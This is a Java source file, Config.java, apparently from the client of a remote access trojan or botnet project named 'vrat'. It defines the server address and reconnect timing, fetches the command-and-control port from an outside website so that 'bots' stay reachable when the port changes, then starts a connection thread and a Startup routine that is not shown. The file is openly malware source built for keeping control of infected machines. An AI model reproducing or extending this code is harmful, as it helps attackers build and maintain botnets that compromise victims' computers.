package vrat.client;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;

/*
 * @author vrmg
 */

public class Config {
    Thread t;
	
	/*
     * The ip of the server
     */
	private String ip = "localhost";

    /*
     * If can't connect to server, wait time before looking for new port and trying to connect again
     */
    private int waitTime = 60000; //miliseconds

    /*
     * Gets the port from a website - That way the bots won't be lost if port changes
     */
	private int getPort() {
		BufferedReader in;
		String i = "";
		try {
			URL whatIsMyPort = new URL("http://vrmg.heliohost.org/");
			in = new BufferedReader(new InputStreamReader(whatIsMyPort.openStream()));
			i = in.readLine();
		}
		catch (Exception e) {
			e.printStackTrace();
			System.out.println("Getting port error - check internet connection");
		}
		try {
			return Integer.parseInt(i);
		}
		catch (NumberFormatException e){
			e.printStackTrace();
			System.out.println("Portnumber on website is wrong");
			//Need to find a way to restart the connection
		}
		return 0;
    }

    /*
     * Starts connection to the server
     */
	public void startConnectThread(){
        t = new Thread(new ClientStarter(49, ip, waitTime));
		t.start();
    }

	public static void main (String arg[]){
		Config c = new Config();	
		c.startConnectThread();
		Startup start = new Startup();
		start.initialize();
	}   
}
